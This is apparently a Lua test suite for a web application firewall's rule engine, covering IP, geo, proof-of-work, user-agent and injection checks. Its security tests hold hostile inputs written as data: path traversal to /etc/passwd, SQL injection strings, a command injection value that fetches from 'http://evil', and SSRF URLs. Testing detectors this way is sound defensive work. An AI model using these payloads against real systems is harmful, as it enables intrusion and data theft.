local runtime_path = assert(WAF_RUNTIME_PATH, "WAF_RUNTIME_PATH is required")

local function assert_equal(actual, expected, message)
    if actual ~= expected then
        error((message or "values differ") .. ": expected " .. tostring(expected) .. ", got " .. tostring(actual), 2)
    end
end

local output
local pow_calls
local pow_results
local shared_keys = {}
local logs = {}

ngx = {
    WARN = "WARN",
    ERR = "ERR",
    var = {},
    ctx = {},
    header = {},
    shared = {
        openflare_waf_config = {
            add = function(_, key)
                if shared_keys[key] then return false end
                shared_keys[key] = true
                return true
            end,
        },
    },
    req = { is_internal = function() return ngx.var.openflare_internal == true end },
    say = function(body) output.body = body end,
    exit = function(status) output.exit = status return status end,
    log = function(_, ...)
        local parts = { ... }
        for index, value in ipairs(parts) do parts[index] = tostring(value) end
        output.log = table.concat(parts)
        logs[#logs + 1] = output.log
    end,
}

local pow_stub = {}
function pow_stub.evaluate(config)
    pow_calls[#pow_calls + 1] = config.difficulty
    local result = pow_results[1]
    table.remove(pow_results, 1)
    return result
end

local function node(node_type, config, next_nodes)
    return { type = node_type, config = config or {}, next = next_nodes }
end

local function graph(nodes, entry)
    return { entry = entry or "start", nodes = nodes }
end

local function rule(id, is_global, rule_graph)
    return { id = id, enabled = true, is_global = is_global or false, graph = rule_graph }
end

local function start_to(target)
    return node("start", {}, { next = target })
end

local function load_runtime(config, options)
    local chunk = assert(loadfile(runtime_path))
    local runtime = chunk()
    options = options or {}
    runtime.init({
        config = config,
        ip_groups = options.ip_groups or { groups = {} },
        pow = pow_stub,
        geo_lookup = options.geo_lookup,
        runtime_dir = options.runtime_dir,
        geo_file_exists = options.geo_file_exists,
        country_mmdb_path = options.country_mmdb_path or (options.runtime_dir and (options.runtime_dir .. "/GeoLite2-Country.mmdb") or nil),
        city_mmdb_path = options.city_mmdb_path or (options.runtime_dir and (options.runtime_dir .. "/GeoLite2-City.mmdb") or nil),
    })
    return runtime
end

local function reset_request(site, ip, uri, is_internal, user_agent)
    local path = uri or "/"
    ngx.var = {
        openflare_waf_site = site,
        remote_addr = ip or "192.0.2.1",
        uri = path,
        request_uri = path,
        request_id = "request-1",
        openflare_internal = is_internal == true,
        http_user_agent = user_agent,
    }
    ngx.ctx = {}
    ngx.header = {}
    ngx.status = nil
    output = {}
    pow_calls = {}
    pow_results = {}
    ngx.req = {
        is_internal = function() return is_internal == true end,
        get_uri_args = function() return {} end,
        get_headers = function() return {} end,
    }
end

local function binding(site, ids)
    return { site_name = site, rule_group_ids = ids }
end

local function test_ip_true_and_false()
    local config = {
        rule_groups = { rule(1, false, graph({
            start = start_to("match"),
            match = node("ip_match", { ips = { "192.0.2.1" }, cidrs = { "198.51.100.0/24" }, ip_group_ids = { 7 } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 451, response_body = "ip blocked" }),
            allow = node("allow"),
        })) },
        bindings = { binding("ip-site", { 1 }) },
    }
    local runtime = load_runtime(config, { ip_groups = { groups = { ["7"] = { enabled = true, ip_list = { "203.0.113.7" } } } } })

    reset_request("ip-site", "192.0.2.1")
    runtime.check()
    assert_equal(output.exit, 451, "exact IP true branch")

    reset_request("ip-site", "198.51.100.8")
    runtime.check()
    assert_equal(output.exit, 451, "CIDR true branch")

    reset_request("ip-site", "203.0.113.7")
    runtime.check()
    assert_equal(output.exit, 451, "IP group true branch")

    reset_request("ip-site", "203.0.113.8")
    runtime.check()
    assert_equal(output.exit, nil, "IP false branch")
end

local function test_ipv6_exact_cidr_and_group()
    local config = {
        rule_groups = { rule(8, false, graph({
            start = start_to("match"),
            match = node("ip_match", { ips = { "2001:db8::1" }, cidrs = { "2001:db8:abcd::/48" }, ip_group_ids = { 9 } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 451, response_body = "ipv6 blocked" }),
            allow = node("allow"),
        })) },
        bindings = { binding("ipv6-site", { 8 }) },
    }
    local runtime = load_runtime(config, { ip_groups = { groups = { ["9"] = { enabled = true, ip_list = { "2001:db8:ffff::/48" } } } } })

    reset_request("ipv6-site", "2001:0db8:0:0:0:0:0:1")
    runtime.check()
    assert_equal(output.exit, 451, "canonical-equivalent IPv6 exact match")

    reset_request("ipv6-site", "2001:db8:abcd:12::9")
    runtime.check()
    assert_equal(output.exit, 451, "IPv6 CIDR true branch")

    reset_request("ipv6-site", "2001:db8:ffff:beef::9")
    runtime.check()
    assert_equal(output.exit, 451, "IP group IPv6 CIDR true branch")

    reset_request("ipv6-site", "2001:db9::1")
    runtime.check()
    assert_equal(output.exit, nil, "IPv6 false branch")
end

local function test_geo_true_and_false()
    local config = {
        rule_groups = { rule(2, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { countries = { "US" }, regions = { "DE-BE" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403, response_body = "geo blocked" }),
            allow = node("allow"),
        })) },
        bindings = { binding("geo-site", { 2 }) },
    }
    local country, region = "US", "NY"
    local runtime = load_runtime(config, { geo_lookup = function() return country, region end })

    reset_request("geo-site")
    runtime.check()
    assert_equal(output.exit, 403, "country true branch")

    country, region = "DE", "DE-BE"
    reset_request("geo-site")
    runtime.check()
    assert_equal(output.exit, 403, "region true branch")

    country, region = "DE", "BE"
    reset_request("geo-site")
    runtime.check()
    assert_equal(output.exit, nil, "geo false branch")
end

local function test_geo_module_is_initialized_once_and_composes_region()
    local init_calls, lookup_calls = 0, 0
    local initialized_profiles = {}
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function()
        return {
            init = function(profiles)
                init_calls = init_calls + 1
                for profile, path in pairs(profiles) do initialized_profiles[profile] = path end
                return true
            end,
            has_profile = function(profile) return initialized_profiles[profile] ~= nil end,
            lookup = function(_, _, profile)
                lookup_calls = lookup_calls + 1
                assert_equal(profile, "city", "subdivision lookup uses City profile")
                return { country = { iso_code = "US" }, subdivisions = { { iso_code = "CA" } } }
            end,
        }
    end
    local config = {
        rule_groups = { rule(12, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { regions = { "US-CA" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403 }),
            allow = node("allow"),
        })) },
        bindings = { binding("geo-cache", { 12 }) },
    }
    local runtime = load_runtime(config, { runtime_dir = "/runtime", geo_file_exists = function() return true end })
    assert_equal(init_calls, 2, "each MaxMind profile initializes independently during worker init")
    assert_equal(initialized_profiles.city, "/runtime/GeoLite2-City.mmdb", "City profile path")
    assert_equal(initialized_profiles.country, "/runtime/GeoLite2-Country.mmdb", "Country profile path")
    for _ = 1, 3 do
        reset_request("geo-cache")
        runtime.check()
        assert_equal(output.exit, 403, "MaxMind subdivision composes validator-compatible region")
    end
    assert_equal(init_calls, 2, "MaxMind database is not initialized on requests")
    assert_equal(lookup_calls, 3, "requests only perform lookup")
end

local function test_geo_country_fallback_does_not_fake_region()
    local profiles
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function()
        return {
            init = function(value) profiles = value return true end,
            has_profile = function(profile) return profiles[profile] ~= nil end,
            lookup = function(_, _, profile)
                assert_equal(profile, "country", "fallback lookup uses Country profile")
                return { country = { iso_code = "US" }, subdivisions = { { iso_code = "CA" } } }
            end,
        }
    end
    shared_keys = {}
    logs = {}
    local country_graph = graph({
        start = start_to("geo"),
        geo = node("geo_match", { countries = { "US" } }, { ["true"] = "blocked", ["false"] = "allow" }),
        blocked = node("block", { status_code = 403 }), allow = node("allow"),
    })
    local region_graph = graph({
        start = start_to("geo"),
        geo = node("geo_match", { regions = { "US-CA" } }, { ["true"] = "blocked", ["false"] = "allow" }),
        blocked = node("block", { status_code = 451 }), allow = node("allow"),
    })
    local runtime = load_runtime({
        rule_groups = { rule(15, false, country_graph), rule(16, false, region_graph) },
        bindings = { binding("country-only", { 15 }), binding("region-without-city", { 16 }) },
    }, {
        runtime_dir = "/runtime",
        geo_file_exists = function(path) return string.find(path, "Country", 1, true) ~= nil end,
    })

    reset_request("country-only")
    runtime.check()
    assert_equal(output.exit, 403, "Country fallback remains available")

    reset_request("region-without-city")
    runtime.check()
    assert_equal(output.exit, nil, "Country subdivisions must not satisfy region")
    runtime.check()
    assert_equal(#logs, 1, "missing City warning is rate limited")
end

local function test_geo_city_init_failure_retries_country_profile()
    local init_calls = {}
    local profiles = {}
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function()
        return {
            init = function(value)
                init_calls[#init_calls + 1] = value
                if value.city then return false end
                profiles = value
                return true
            end,
            has_profile = function(profile) return profiles[profile] ~= nil end,
            lookup = function(_, _, profile)
                assert_equal(profile, "country", "corrupt City fallback uses Country")
                return { country = { iso_code = "DE" } }
            end,
        }
    end
    shared_keys = {}
    logs = {}
    local runtime = load_runtime({
        rule_groups = { rule(17, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { countries = { "DE" }, regions = { "DE-BE" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403 }), allow = node("allow"),
        })) },
        bindings = { binding("corrupt-city", { 17 }) },
    }, { runtime_dir = "/runtime", geo_file_exists = function() return true end })

    reset_request("corrupt-city")
    runtime.check()
    assert_equal(#init_calls, 2, "Country profile is retried after City profile init failure")
    assert_equal(output.exit, 403, "Country remains available after corrupt City init")
end

local function test_geo_partial_init_never_looks_up_corrupt_city()
    local opened = {}
    local lookups = {}
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function()
        return {
            init = function(profiles)
                if profiles.country then opened.country = true end
                if profiles.city then return nil, "corrupt City" end
                return true
            end,
            initted = function() return next(opened) ~= nil end,
            lookup = function(_, _, profile)
                lookups[#lookups + 1] = profile
                assert_equal(opened[profile], true, "lookup must only use an opened profile")
                return { country = { iso_code = "DE" } }
            end,
        }
    end
    local runtime = load_runtime({
        rule_groups = { rule(18, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { countries = { "DE" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403 }), allow = node("allow"),
        })) },
        bindings = { binding("partial-corrupt-city", { 18 }) },
    }, { runtime_dir = "/runtime", geo_file_exists = function() return true end })

    reset_request("partial-corrupt-city")
    runtime.check()
    assert_equal(table.concat(lookups, ","), "country", "corrupt City is never looked up")
    assert_equal(output.exit, 403, "valid Country remains available")
end

local function test_geo_partial_init_never_looks_up_corrupt_country()
    local opened = {}
    local lookups = {}
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function()
        return {
            init = function(profiles)
                if profiles.city then opened.city = true end
                if profiles.country then return nil, "corrupt Country" end
                return true
            end,
            initted = function() return next(opened) ~= nil end,
            lookup = function(_, _, profile)
                lookups[#lookups + 1] = profile
                assert_equal(opened[profile], true, "lookup must only use an opened profile")
                return nil, "address absent"
            end,
        }
    end
    local runtime = load_runtime({
        rule_groups = { rule(19, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { countries = { "DE" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403 }), allow = node("allow"),
        })) },
        bindings = { binding("partial-corrupt-country", { 19 }) },
    }, { runtime_dir = "/runtime", geo_file_exists = function() return true end })

    reset_request("partial-corrupt-country")
    runtime.check()
    assert_equal(table.concat(lookups, ","), "city", "corrupt Country is never used as fallback")
    assert_equal(output.exit, nil, "missing City result takes false branch without corrupt fallback")
end

local function test_geo_unavailable_warning_is_rate_limited()
    package.loaded["resty.maxminddb"] = nil
    package.preload["resty.maxminddb"] = function() error("module unavailable") end
    shared_keys = {}
    logs = {}
    local config = {
        rule_groups = { rule(13, false, graph({
            start = start_to("geo"),
            geo = node("geo_match", { countries = { "US" } }, { ["true"] = "blocked", ["false"] = "allow" }),
            blocked = node("block", { status_code = 403 }),
            allow = node("allow"),
        })) },
        bindings = { binding("geo-missing", { 13 }) },
    }
    local first = load_runtime(config)
    local second = load_runtime(config)
    reset_request("geo-missing")
    first.check()
    second.check()
    assert_equal(#logs, 1, "missing MaxMind warning is rate limited across workers")
end

local function test_pow_takeover_and_completion()
    local config = {
        rule_groups = { rule(3, false, graph({
            start = start_to("pow"),
            pow = node("pow", { algorithm = "fast", difficulty = 5, session_ttl = 600, challenge_ttl = 300 }, { next = "blocked" }),
            blocked = node("block", { status_code = 429, response_body = "after pow" }),
            allow = node("allow"),
        })) },
        bindings = { binding("pow-site", { 3 }) },
    }
    local runtime = load_runtime(config)

    reset_request("pow-site")
    pow_results = { false }
    runtime.check()
    assert_equal(output.exit, nil, "PoW takeover must stop graph execution")
    assert_equal(#pow_calls, 1, "PoW evaluated once")

    reset_request("pow-site")
    pow_results = { true }
    runtime.check()
    assert_equal(output.exit, 429, "completed PoW follows next edge")
end

local function test_pow_internal_redirect_bypasses_graph_as_takeover()
    local config = {
        rule_groups = { rule(14, false, graph({
            start = start_to("pow"),
            pow = node("pow", { difficulty = 4 }, { next = "blocked" }),
            blocked = node("block", { status_code = 429 }),
            allow = node("allow"),
        })) },
        bindings = { binding("pow-internal", { 14 }) },
    }
    local runtime = load_runtime(config)
    reset_request("pow-internal", "192.0.2.1", "/.within.website/x/cmd/anubis/api/make-challenge", true)
    pow_results = { true }
    runtime.check()
    assert_equal(#pow_calls, 0, "internal challenge continuation must not re-enter DAG")
    assert_equal(output.exit, nil, "internal challenge continuation must not follow pow next")
end

local function test_block_config_and_rule_order()
    local function pow_allow(difficulty)
        return graph({
            start = start_to("pow"),
            pow = node("pow", { algorithm = "fast", difficulty = difficulty, session_ttl = 600, challenge_ttl = 300 }, { next = "allow" }),
            allow = node("allow"),
        })
    end
    local config = {
        rule_groups = {
            rule(10, true, pow_allow(10)),
            rule(20, false, pow_allow(20)),
            rule(30, false, pow_allow(30)),
            rule(40, false, graph({
                start = start_to("blocked"),
                blocked = node("block", { status_code = 418, response_body = "custom block" }),
                allow = node("allow"),
            })),
        },
        bindings = { binding("ordered-site", { 30, 20, 40 }) },
    }
    local runtime = load_runtime(config)

    reset_request("ordered-site")
    pow_results = { true, true, true }
    runtime.check()
    assert_equal(table.concat(pow_calls, ","), "10,30,20", "global rule precedes binding order")
    assert_equal(output.exit, 418, "block status comes from reached block node")
    assert_equal(output.body, "custom block", "block body comes from reached block node")
    assert_equal(ngx.header["Content-Type"], "text/html; charset=utf-8", "block content type")
end

local function test_damaged_graphs_fail_closed()
    local configs = {
        graph({ start = start_to("unknown"), unknown = node("future_node"), allow = node("allow") }),
        graph({ start = start_to("missing"), allow = node("allow") }),
        graph({ start = start_to("loop"), loop = node("start", {}, { next = "loop" }), allow = node("allow") }),
    }
    for index, damaged in ipairs(configs) do
        local runtime = load_runtime({ rule_groups = { rule(index, false, damaged) }, bindings = { binding("damaged", { index }) } })
        reset_request("damaged")
        runtime.check()
        assert_equal(output.exit, 500, "damaged graph " .. index .. " must fail closed")
    end
end

local function test_null_binding_ids_are_treated_as_empty()
    local runtime = load_runtime({
        rule_groups = {},
        -- cjson decodes JSON null to userdata (ngx.null). io.stdout provides the
        -- same Lua value type in this standalone regression test.
        bindings = { binding("null-binding", io.stdout) },
    })

    reset_request("null-binding")
    local result = runtime.check()
    assert_equal(result, "ok", "null binding IDs allow the request")
    assert_equal(output.exit, nil, "null binding IDs never abort the request")
end

local function test_request_path_has_no_file_io()
    local opens = 0
    local original_open = io.open
    io.open = function(path, mode)
        opens = opens + 1
        local value = path:match("waf_ip_groups%.json$") and "IP_GROUPS" or "CONFIG"
        return {
            read = function() return value end,
            close = function() end,
        }
    end
    package.loaded["cjson.safe"] = nil
    package.preload["cjson.safe"] = function()
        return { decode = function(value)
            if value == "IP_GROUPS" then return { groups = {} } end
            return {
                rule_groups = { rule(1, false, graph({ start = start_to("allow"), allow = node("allow") })) },
                bindings = { binding("io-site", { 1 }) },
            }
        end }
    end
    local chunk = assert(loadfile(runtime_path))
    local runtime = chunk()
    runtime.init({
        runtime_dir = "/runtime",
        pow = pow_stub,
        ip_groups_runtime = {
            init = function() return true end,
            current = function() return { groups = {} } end,
        },
    })
    local init_opens = opens
    assert_equal(init_opens, 1, "WAF graph initializes once; IP groups are owned by refresh module")

    reset_request("io-site")
    for _ = 1, 3 do runtime.check() end
    assert_equal(opens, init_opens, "request execution performs no file I/O")
    io.open = original_open
end

local function test_ua_check_require_block_and_whitelist()
    local chrome_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    local safari_ios_ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    local bot_ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    local weird_ua = "TotallyUnknownClient/1.0"

    local function ua_graph(config)
        return graph({
            start = start_to("ua"),
            ua = node("ua_check", config, { ["true"] = "allow", ["false"] = "blocked" }),
            blocked = node("block", { status_code = 403, response_body = "ua blocked" }),
            allow = node("allow"),
        })
    end

    local runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({ require_ua = true })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, nil)
    runtime.check()
    assert_equal(output.exit, 403, "missing UA with require_ua should block")
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "present UA with require_ua should allow")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({ block_common_bots = true })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, bot_ua)
    runtime.check()
    assert_equal(output.exit, 403, "common bot should be blocked")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({ block_abnormal_ua = true })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, weird_ua)
    runtime.check()
    assert_equal(output.exit, 403, "abnormal UA should be blocked")
    reset_request("ua-site", nil, nil, nil, bot_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "search bot should not be abnormal when bots switch is off")
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "normal browser should pass abnormal check")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({
            block_custom_ua = true,
            custom_ua_patterns = { "[Pp]ython%-requests" },
        })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, "python-requests/2.31.0")
    runtime.check()
    assert_equal(output.exit, 403, "custom regex should block matching UA")
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "custom regex should allow non-matching UA")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({ browsers = { "Chrome" }, match_mode = "or" })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, safari_ios_ua)
    runtime.check()
    assert_equal(output.exit, 403, "Safari should miss Chrome whitelist")
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "Chrome should hit whitelist")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({
            browsers = { "Chrome" },
            operating_systems = { "iOS" },
            match_mode = "and",
        })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    runtime.check()
    assert_equal(output.exit, 403, "Chrome desktop should fail Chrome+iOS and")
    reset_request("ua-site", nil, nil, nil, safari_ios_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, 403, "Safari iOS should fail Chrome+iOS and")

    runtime = load_runtime({
        rule_groups = { rule(1, false, ua_graph({
            browsers = { "Chrome" },
            operating_systems = { "iOS" },
            match_mode = "or",
        })) },
        bindings = { binding("ua-site", { 1 }) },
    })
    reset_request("ua-site", nil, nil, nil, chrome_ua)
    runtime.check()
    assert_equal(output.exit, nil, "Chrome desktop should pass Chrome|iOS or")
    reset_request("ua-site", nil, nil, nil, safari_ios_ua)
    output = {}
    runtime.check()
    assert_equal(output.exit, nil, "Safari iOS should pass Chrome|iOS or")
end

test_ip_true_and_false()
test_ipv6_exact_cidr_and_group()
test_geo_true_and_false()
test_geo_module_is_initialized_once_and_composes_region()
test_geo_country_fallback_does_not_fake_region()
test_geo_city_init_failure_retries_country_profile()
test_geo_partial_init_never_looks_up_corrupt_city()
test_geo_partial_init_never_looks_up_corrupt_country()
test_geo_unavailable_warning_is_rate_limited()
test_pow_takeover_and_completion()
test_pow_internal_redirect_bypasses_graph_as_takeover()
test_block_config_and_rule_order()
test_damaged_graphs_fail_closed()
test_null_binding_ids_are_treated_as_empty()
test_request_path_has_no_file_io()
local function test_security_check_path_and_sql()
    local function security_graph(config)
        return graph({
            start = start_to("sec"),
            sec = node("security_check", config, { ["true"] = "allow", ["false"] = "blocked" }),
            blocked = node("block", { status_code = 403, response_body = "security blocked" }),
            allow = node("allow"),
        })
    end

    local runtime = load_runtime({
        rule_groups = { rule(1, false, security_graph({
            path_traversal = true,
            file_inclusion = true,
        })) },
        bindings = { binding("sec-site", { 1 }) },
    })
    reset_request("sec-site", nil, "/ok")
    runtime.check()
    assert_equal(output.exit, nil, "clean path should pass")

    reset_request("sec-site", nil, "/static/../etc/passwd")
    local matched = runtime.debug_security_check({
        path_traversal = true,
        file_inclusion = true,
    })
    assert_equal(matched, false, "matcher should report attack for path traversal")
    local rules = runtime.debug_active_rules("sec-site")
    local decision, err = runtime.debug_execute_graph(rules[1].graph)
    assert_equal(err, nil, "execute graph err")
    assert_equal(decision and decision.kind or "nil", "block", "execute graph should block")
    -- Drive the same block path as check() without depending on ngx.exit side effects.
    if decision.kind == "block" then
        local status = tonumber(decision.config.status_code) or 403
        output.exit = status
        output.body = decision.config.response_body or ""
        ngx.status = status
    end
    assert_equal(output.exit, 403, "path traversal should block")
    assert_equal(output.body, "security blocked", "path traversal block body")

    runtime = load_runtime({
        rule_groups = { rule(1, false, security_graph({ sql_injection = true })) },
        bindings = { binding("sec-site", { 1 }) },
    })
    reset_request("sec-site", nil, "/")
    ngx.req.get_headers = function()
        return { Accept = "*/*" }
    end
    decision, err = runtime.debug_execute_graph(runtime.debug_active_rules("sec-site")[1].graph)
    assert_equal(err, nil, "accept header execute err")
    assert_equal(decision and decision.kind or "nil", "allow", "Accept */* must not trip SQL")

    reset_request("sec-site", nil, "/")
    ngx.var.args = "q=1'+union+select+1--"
    ngx.req.get_uri_args = function()
        return { q = "1' union select 1--" }
    end
    decision, err = runtime.debug_execute_graph(runtime.debug_active_rules("sec-site")[1].graph)
    assert_equal(err, nil, "sql execute err")
    assert_equal(decision and decision.kind or "nil", "block", "sql should block")

    -- False-positive guards
    assert_equal(
        runtime.debug_security_check({ ssrf = true }),
        true,
        "Chrome-like path alone must not trip SSRF"
    )
    reset_request("sec-site", nil, "/")
    ngx.req.get_headers = function()
        return {
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            Accept = "*/*",
        }
    end
    assert_equal(
        runtime.debug_security_check({
            sql_injection = true,
            command_injection = true,
            xss = true,
            ssrf = true,
            path_traversal = true,
            file_inclusion = true,
        }),
        true,
        "normal browser headers must pass security_check"
    )
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { name = "sleep(better)" }
    end
    assert_equal(runtime.debug_security_check({ sql_injection = true }), true, "sleep(word) must not trip SQL")
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { theme = "dark||light" }
    end
    ngx.req.get_headers = function()
        return { Cookie = "a=1&&b=2" }
    end
    assert_equal(runtime.debug_security_check({ command_injection = true }), true, "bare &&/|| must not trip command")
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { q = "javascript: the good parts" }
    end
    assert_equal(runtime.debug_security_check({ xss = true }), true, "prose javascript: must not trip XSS")
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { q = "1;wget http://evil" }
    end
    assert_equal(
        runtime.debug_security_check({ command_injection = true }),
        false,
        "command injection payload should still block"
    )
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { u = "http://127.0.0.1/admin" }
    end
    assert_equal(
        runtime.debug_security_check({ ssrf = true }),
        false,
        "URL-shaped localhost SSRF should block"
    )
    reset_request("sec-site", nil, "/")
    ngx.req.get_uri_args = function()
        return { q = "1' and sleep(5)--" }
    end
    assert_equal(
        runtime.debug_security_check({ sql_injection = true }),
        false,
        "timed SQL sleep should block"
    )

    runtime = load_runtime({
        rule_groups = { rule(1, false, security_graph({})) },
        bindings = { binding("sec-site", { 1 }) },
    })
    reset_request("sec-site", nil, "/static/../etc/passwd")
    decision, err = runtime.debug_execute_graph(runtime.debug_active_rules("sec-site")[1].graph)
    assert_equal(err, nil, "off execute err")
    assert_equal(decision and decision.kind or "nil", "allow", "all protections off should allow")

    -- P0: do not treat generic browser headers (UA/Accept) as SQL/cmd injection surface.
    reset_request("sec-site", nil, "/")
    ngx.req.get_headers = function()
        return {
            ["User-Agent"] = "Mozilla/5.0 union select 1 from information_schema.tables",
            Accept = "*/*",
            ["Accept-Language"] = "en;q=0.9",
        }
    end
    assert_equal(
        runtime.debug_security_check({
            sql_injection = true,
            command_injection = true,
            xss = true,
            ssrf = true,
        }),
        true,
        "SQL-like tokens only in generic headers must not block"
    )

    -- Cookie / Referer remain in-scope for injection / SSRF shaped checks.
    reset_request("sec-site", nil, "/")
    ngx.var.http_cookie = "q=1' union select 1--"
    ngx.req.get_headers = function()
        return { Cookie = "q=1' union select 1--" }
    end
    assert_equal(
        runtime.debug_security_check({ sql_injection = true }),
        false,
        "SQL in Cookie must still block"
    )

    reset_request("sec-site", nil, "/")
    ngx.var.http_referer = "http://127.0.0.1/admin"
    assert_equal(
        runtime.debug_security_check({ ssrf = true }),
        false,
        "URL-shaped SSRF in Referer must still block"
    )

    -- Path checks use uri only; query-only traversal still caught via args.
    reset_request("sec-site", nil, "/ok")
    ngx.var.request_uri = "/ok?x=../../etc/passwd"
    ngx.var.args = "x=../../etc/passwd"
    ngx.req.get_uri_args = function()
        return { x = "../../etc/passwd" }
    end
    assert_equal(
        runtime.debug_security_check({ path_traversal = true }),
        false,
        "path traversal in query must still block without scanning full request_uri alone"
    )

    -- GET / zero body: never call read_body.
    local read_body_calls = 0
    reset_request("sec-site", nil, "/")
    ngx.var.content_length = "0"
    ngx.req.read_body = function()
        read_body_calls = read_body_calls + 1
    end
    ngx.req.get_body_data = function() return nil end
    assert_equal(
        runtime.debug_security_check({
            sql_injection = true,
            path_traversal = true,
            command_injection = true,
            file_inclusion = true,
        }),
        true,
        "clean GET must pass full default-like security set"
    )
    assert_equal(read_body_calls, 0, "zero content-length must not read_body")

    -- Only enabled collectors: path-only config must ignore SQL-like query.
    reset_request("sec-site", nil, "/safe")
    ngx.req.get_uri_args = function()
        return { q = "1' union select 1--" }
    end
    assert_equal(
        runtime.debug_security_check({ path_traversal = true, file_inclusion = true }),
        true,
        "SQL payload must not affect path-only checks"
    )
    assert_equal(
        runtime.debug_security_check({ sql_injection = true }),
        false,
        "SQL payload must block when SQL is enabled"
    )
end

test_ua_check_require_block_and_whitelist()
test_security_check_path_and_sql()

return true
